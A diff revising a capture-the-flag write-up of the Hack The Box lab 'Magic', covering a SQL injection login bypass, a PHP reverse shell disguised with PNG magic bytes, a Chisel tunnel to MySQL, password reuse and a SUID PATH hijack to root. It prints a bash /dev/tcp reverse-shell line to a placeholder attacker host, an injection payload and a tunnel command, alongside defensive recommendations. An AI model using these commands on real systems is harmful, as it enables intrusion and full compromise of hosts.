@@ -1,5 +1,5 @@
 ---
-title: "Magic: SQL Injection, File Upload Bypass, and PATH Hijack"
+title: "Magic — SQL Injection and Magic-Byte Upload Bypass to SUID PATH Hijack"
 description: "SQL injection in a login page and PNG magic-byte upload evasion provide a foothold; MySQL credentials tunneled through Chisel and reused admin credentials enable lateral movement, and a SUID sysinfo binary is hijacked through PATH to reach root."
 type: case-study
 platform: Hack The Box
@@ -11,86 +11,141 @@ tags:
   - web
   - sql-injection
   - privilege-escalation
+objective: "Move from unauthenticated web access through a SQL injection login bypass and a magic-byte upload evasion to root via a SUID binary PATH hijack."
+tools:
+  - rustscan
+  - nmap
+  - feroxbuster
+  - penelope
+  - chisel
+  - mysql
+  - suid3num
+  - strings
+skill: "Web application exploitation and Linux privilege escalation via a SUID PATH hijack"
+outcome: "Command execution as `www-data` through upload evasion and a root context via the SUID `/bin/sysinfo` PATH hijack"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Linux (Ubuntu 18.04); Apache httpd 2.4.29 hosting a PHP web application |
+| Starting position | Unauthenticated network access |
+| Objective | Move from unauthenticated web access through a SQL injection login bypass and a magic-byte upload evasion to root via a SUID binary PATH hijack |
+| Outcome | `www-data` command execution; root context via the SUID `/bin/sysinfo` PATH hijack |
 
 ## Summary
 
-Magic is a retired Easy Linux machine featuring a web application with an SQL injection vulnerability in the login page, granting access to an admin upload panel. The file upload restriction is bypassed by injecting PNG magic bytes into a PHP reverse shell. After obtaining a foothold as `<WEB_SERVICE_ACCOUNT>`, MySQL credentials found in the application configuration are used to tunnel the local database and extract admin credentials, which are reused for the `<LAB_USER>` user. Privilege escalation is achieved through a PATH hijack on the SUID binary `/bin/sysinfo`, which calls system commands — including `cat` — without absolute paths.
+Magic is a Medium-rated Hack The Box Linux lab whose PHP portfolio application exposes a SQL injection flaw in its login page, an upload panel that validates files by magic bytes, and a SUID binary that invokes system commands through `PATH`. Chaining these flaws turns unauthenticated web access into a root shell, without any software exploit beyond the injection and the local misconfiguration. Target, attacker, account, and secret values are replaced with role-based placeholders; command syntax is preserved.
 
-All target and operator-specific values below are sanitized placeholders.
+**Attack path:** **SQL injection login bypass → admin upload panel → PNG magic-byte upload evasion → `www-data` reverse shell → plaintext database credentials → Chisel-tunneled MySQL → admin credential recovery → password reuse for `<LAB_USER>` → SUID `/bin/sysinfo` PATH hijack → root**
 
 ## Context and Objective
 
-- **Target OS:** Linux (Ubuntu 18.04)
-- **Difficulty:** Easy
-- **Open services:** SSH (22), HTTP (80)
-- **Goal:** Compromise the target, escalate to `<LAB_USER>`, then escalate to `<PRIVILEGED_ACCOUNT>`.
+- **Target:** Linux (Ubuntu 18.04) running Apache httpd 2.4.29 with a PHP web application.
+- **Exposed services:** SSH (22) and HTTP (80).
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** convert a web application foothold into a stable shell, then follow exposed credentials and a privileged local binary to root.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Stage 1 — Port Scanning
+### 1. Service Enumeration
 
-Port scanning with `rustscan` reveals two open ports:
+Observation: a full TCP scan exposes two services.
 
 ```bash
 rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Magic-TCP
 ```
 
+Truncated scan output:
+
 ```text
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
-80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Magic Portfolio
 ```
 
-Two services are available: SSH on port 22 and Apache HTTP on port 80 hosting a "Magic Portfolio" site.
+Significance: HTTP hosts the "Magic Portfolio" site, while SSH offers a remote shell but no credential path yet, so the web application is the initial attack surface. The banners identify the platform and web server versions.
 
-### Stage 2 — Web Enumeration and SQL Injection
+Result: SSH and Apache HTTP are exposed on an Ubuntu host.
 
-Directory enumeration with `feroxbuster` discovers a login page at `/login.php`:
+### 2. Web Content Discovery
+
+Observation: directory enumeration uncovers a login page.
 
 ```bash
 feroxbuster --url http://<TARGET_IP> --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
 
-The login form is vulnerable to SQL injection. An authentication bypass payload grants access to the admin panel:
+Truncated discovery output:
+
+```text
+http://<TARGET_IP>/login.php
+```
+
+Significance: an authenticated login form gates the application's privileged functionality.
+
+Result: a login page is reachable at `/login.php`.
+
+### 3. SQL Injection Authentication Bypass
+
+Observation: the login form is vulnerable to SQL injection, so an authentication clause can be forced true.
+
+Action:
 
 ```sql
 ' OR '1'='1
 ```
 
-The admin panel reveals an upload page at `/upload.php`.
+Significance: a tautology payload defeats the login check when input is concatenated into a query instead of parameterized. The source records access to the admin panel and its upload page at `/upload.php`.
 
-### Stage 3 — File Upload Restriction Bypass
+Result: the login check is bypassed and the upload page is reachable.
 
-The upload page restricts files to image types (`JPG`, `JPEG`, `PNG`), checking file magic bytes rather than extension alone. A PHP reverse shell is disguised as a valid PNG file by prepending the PNG magic byte header:
+### 4. File Upload Restriction Bypass
+
+Observation: the upload page accepts only image types (`JPG`, `JPEG`, `PNG`), judging by file magic bytes rather than extension alone.
+
+Action: a PHP payload is wrapped with a PNG signature so it satisfies the content check.
 
 ```bash
-python3 ~/Tools/mime-file-forge/fforge.py forge --payload-file revshell.php -t png -o fakepic.php.png
+python3 <FORGE_SCRIPT> forge --payload-file revshell.php -t png -o fakepic.php.png
 ```
 
 ```text
 Wrote: fakepic.png
 Signature: png (image/png)
-Separator: newline
 Payload bytes: 2585
 Total bytes: 2594
 ```
 
-The resulting file passes the magic-byte check while retaining its PHP payload.
+Significance: validating content type by magic bytes alone does not prevent a polyglot file that is simultaneously a valid image and executable PHP.
 
-### Stage 4 — Reverse Shell
+Result: a PNG-signature file carrying the PHP payload is produced.
 
-A listener is started on the attacker machine:
+### 5. Reverse Shell
+
+Observation: once the forged file is reachable under the web root, requesting it executes the embedded PHP.
+
+Action: start a handler, then request the uploaded file at `http://<TARGET_IP>/images/uploads/fakepic.php.png`.
 
 ```bash
 penelope -p <LISTENER_PORT>
 ```
 
-The uploaded shell is accessed at the uploads directory, executing the PHP code and returning a reverse shell as `<WEB_SERVICE_ACCOUNT>`.
+```text
+www-data@<TARGET_HOST>
+```
 
-### Stage 5 — Database Credential Discovery
+Significance: the upload directory serves and executes PHP, so an uploaded file becomes code execution in the web server account.
 
-The application's database configuration file contains MySQL credentials in plaintext:
+Result: a reverse shell as `www-data` is obtained.
+
+### 6. Database Configuration Disclosure
+
+Observation: the application configuration file stores database credentials in plaintext.
 
 ```bash
 cat /var/www/Magic/db.php5
@@ -101,7 +156,7 @@ private static $dbUsername = '<DB_USER>';
 private static $dbUserPassword = '<DB_PASSWORD>';
 ```
 
-MySQL is bound to localhost only, making it inaccessible directly from the attacker machine:
+The database listens only on loopback, so it is not directly reachable:
 
 ```bash
 ss -tulpn
@@ -111,51 +166,46 @@ ss -tulpn
 tcp    LISTEN   0   80   127.0.0.1:3306   0.0.0.0:*
 ```
 
-### Stage 6 — MySQL Tunneling via Chisel
+Significance: a plaintext database credential inside the web root is directly usable once the service becomes reachable; binding MySQL to `127.0.0.1` removes direct external access but not access from the host.
 
-Chisel is transferred to the target and used to set up a reverse tunnel, forwarding the remote MySQL port to a local port on the attacker machine:
+Result: database credentials are recovered, and the database is confirmed to listen only on loopback.
+
+### 7. MySQL Tunneling via Chisel
+
+Observation: because MySQL listens only on `127.0.0.1`, a reverse tunnel forwards that port to the attack machine.
+
+Action:
 
 ```bash
-wget http://<ATTACKER_IP>/linux/chisel
-chmod +x chisel
-```
-
-A Chisel reverse server is started on the attacker machine:
-
-```bash
+# On the attacker host
 chisel server --reverse -p <CHISEL_PORT>
 ```
 
-On the target, the Chisel client connects back, forwarding port 13306 on the attacker side to MySQL on the target:
-
 ```bash
-./chisel client <ATTACKER_IP>:<CHISEL_PORT> R:13306:127.0.0.1:3306
+# On the target
+./chisel client <ATTACKER_HOST>:<CHISEL_PORT> R:13306:127.0.0.1:3306
 ```
 
-The tunneled MySQL service is accessible from the attacker machine:
+The tunneled service is then reachable locally:
 
 ```bash
 mysql -h 127.0.0.1 -P 13306 -u <DB_USER> -p
 ```
 
-### Stage 7 — Database Enumeration
+```text
+Enter password: <DB_PASSWORD>
+```
 
-Inside the MySQL shell, the `Magic` database is explored:
+Significance: a reverse tunnel exposes a loopback-only service to the attack machine, turning a local-only database into a remote target without any firewall change.
+
+Result: the tunneled MySQL instance is reachable and accepts the recovered database credentials.
+
+### 8. Database Enumeration
+
+Observation: the application database contains an account table.
 
 ```sql
 show databases;
-```
-
-```text
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| Magic              |
-+--------------------+
-```
-
-```sql
 USE Magic;
 SHOW TABLES;
 DESCRIBE login;
@@ -163,18 +213,20 @@ SELECT * FROM login;
 ```
 
 ```text
-+----+----------+----------------+
-| id | username | password       |
-+----+----------+----------------+
-|  1 | admin    | <ADMIN_PASSWORD> |
-+----+----------+----------------+
++----+----------+-----------------+
+| id | username | password        |
++----+----------+-----------------+
+|  1 | <ADMIN_USER> | <ADMIN_PASSWORD> |
++----+----------+-----------------+
 ```
 
-The admin password is recovered from the `login` table.
+Significance: the application stores account passwords in plaintext, so database access yields the administrative credential.
 
-### Stage 8 — Privilege Escalation to theseus
+Result: the admin credential is recovered from the `login` table.
 
-The database password is reused for the `<LAB_USER>` system user:
+### 9. Lateral Movement to `<LAB_USER>`
+
+Observation: the password recovered from the `login` table is reused for a system account.
 
 ```bash
 su - <LAB_USER>
@@ -188,11 +240,13 @@ Password: <ADMIN_PASSWORD>
 <LAB_USER>@<TARGET_HOST>:~$
 ```
 
-The user flag is accessible from the `<LAB_USER>` home directory.
+Significance: reusing an application credential for a system account bridges database access and shell access, so a leaked application secret grants an interactive account.
 
-### Stage 9 — SUID Binary Discovery
+Result: a shell as `<LAB_USER>` is obtained.
 
-SUID enumeration reveals a custom binary with the setuid bit set:
+### 10. SUID Binary Discovery
+
+Observation: SUID enumeration finds a non-standard setuid binary.
 
 ```bash
 python3 suid3num.py
@@ -205,58 +259,75 @@ python3 suid3num.py
 ------------------------------
 ```
 
-### Stage 10 — Sysinfo PATH Hijack
+Significance: a custom setuid binary runs with elevated privileges and is the most promising local escalation target.
 
-Examining the binary with `strings` reveals that it calls several system commands without specifying absolute paths:
+Result: `/bin/sysinfo` is identified as a custom SUID binary.
+
+### 11. PATH Hijack to Root
+
+Observation: `strings` shows the binary invokes system utilities by bare name, relying on `PATH`.
 
 ```bash
 strings /bin/sysinfo
 ```
 
 ```text
-popen() failed!
 ====================Hardware Info====================
 lshw -short
 ====================Disk Info====================
 fdisk -l
 ====================CPU Info====================
 cat /proc/cpuinfo
-====================MEM Usage=====================
 ```
 
-The `cat` command is invoked without a full path. By prepending `/tmp` to `PATH`, a malicious `cat` script is executed instead when `/bin/sysinfo` runs:
+Action: prepend a writable directory containing a malicious `cat` to `PATH`, then run the binary.
 
 ```bash
 export PATH=/tmp:$PATH
-echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<LISTENER_PORT> 0>&1"' > /tmp/cat
+echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_HOST>/<LISTENER_PORT> 0>&1"' > /tmp/cat
 chmod +x /tmp/cat
 sysinfo
 ```
 
 ```text
-<PRIVILEGED_ACCOUNT>@<TARGET_HOST>:/#
+root@<TARGET_HOST>:/#
 ```
 
-The `<PRIVILEGED_RESULT>` is captured.
+Significance: a setuid program that resolves commands through the inherited `PATH` executes whatever the caller places first, so a low-privileged account can supply a replacement binary and gain the program's privileges.
+
+Result: the callback returns a root shell, confirmed by the root prompt.
 
 ## Challenges and Decisions
 
-- MySQL bound to localhost required an additional tunneling step (Chisel) before credential extraction could proceed.
-- The file upload restriction was based on magic bytes rather than extension alone, requiring a PNG-header injection tool instead of a simple rename.
-- The SUID binary `/bin/sysinfo` invoked `cat` without an absolute path, enabling PATH hijacking with a minimal attacker-controlled script.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| MySQL listened only on `127.0.0.1` | Forwarded the port over a Chisel reverse tunnel | The database is not directly reachable from the attack machine |
+| Upload validation compared magic bytes, not extensions | Wrapped the PHP payload with a PNG signature | An extension rename alone would not satisfy the content check |
+| `/bin/sysinfo` invoked `cat` without an absolute path | Prepended `/tmp` to `PATH` and supplied a `cat` replacement | The binary resolves commands through the inherited `PATH` |
 
 ## Outcome
 
-Complete compromise of the target was achieved: web access via SQL injection, file upload bypass for initial shell, database credential extraction via tunneling, lateral movement to `<LAB_USER>` via credential reuse, and privilege escalation via SUID PATH hijack.
+The evidence establishes a root context on the target, reached from unauthenticated web access.
 
 ## Lessons and Recommendations
 
-- SQL injection on login pages remains a critical vulnerability; parameterized queries or prepared statements prevent authentication bypass entirely.
-- File upload restrictions based solely on magic bytes are trivially bypassed; server-side validation should also verify file content and enforce strict storage policies.
-- Application configuration files containing plaintext database credentials are a high-value target; use environment variables or secret management systems.
-- SUID binaries that invoke system commands without absolute paths are susceptible to PATH hijacking; all external calls should use absolute paths or validated `PATH` values.
-- Credential reuse between database accounts and system accounts bridges web access and shell access; enforce unique credentials across tiers.
+Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. These actions are recommendations; none was validated in the lab.
+
+1. **SQL injection in the login form.** User input reached the authentication query without parameterization, so a tautology payload authenticated as an administrator. *Recommendation:* use parameterized queries or prepared statements. *Detection:* alert on authentication requests containing SQL metacharacters.
+2. **Upload validation by magic bytes only.** The upload panel accepted a file based on its leading signature, so a PHP payload wrapped with a PNG header executed from the upload directory. *Recommendation:* validate extension and content together, store uploads outside the web root, and disable script execution in upload directories. *Detection:* monitor upload directories for newly written executable files.
+3. **Plaintext database credentials in the application.** The configuration file stored the database password in cleartext, yielding database access from a web foothold. *Recommendation:* keep secrets out of the web root and load them from a secrets manager or a restricted environment file. *Detection:* scan web-accessible files for credential-shaped strings.
+4. **Credential reuse between tiers.** An application account password also authenticated a system account. *Recommendation:* issue unique credentials per account and service. *Detection:* alert on a system account authenticating with a credential associated with an application.
+5. **SUID binary resolving commands through `PATH`.** `/bin/sysinfo` invoked `cat` by name, so a caller-controlled `PATH` redirected execution. *Recommendation:* call external commands by absolute path in privileged binaries and reset `PATH` to a trusted value. *Validation:* inventory SUID binaries and review them for unqualified command invocations.
 
 ## References
 
-- HTB machine: [Magic](https://app.hackthebox.com/machines/Magic)
+- [Hack The Box — Magic](https://app.hackthebox.com/machines/Magic) (retired machine)
+- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner wrapping Nmap)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
+- [feroxbuster](https://github.com/epi052/feroxbuster) (content discovery)
+- [Penelope](https://github.com/brightio/penelope) (reverse-shell handler)
+- [Chisel](https://github.com/jpillora/chisel) (TCP tunnel over HTTP)
+- [MySQL Client — `mysql` command](https://dev.mysql.com/doc/refman/8.0/en/mysql.html)
+- [suid3num](https://github.com/Anon-Exploiter/SUID3NUM) (SUID enumeration)
+- [GNU Binutils — `strings`](https://man7.org/linux/man-pages/man1/strings.1.html)
+- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
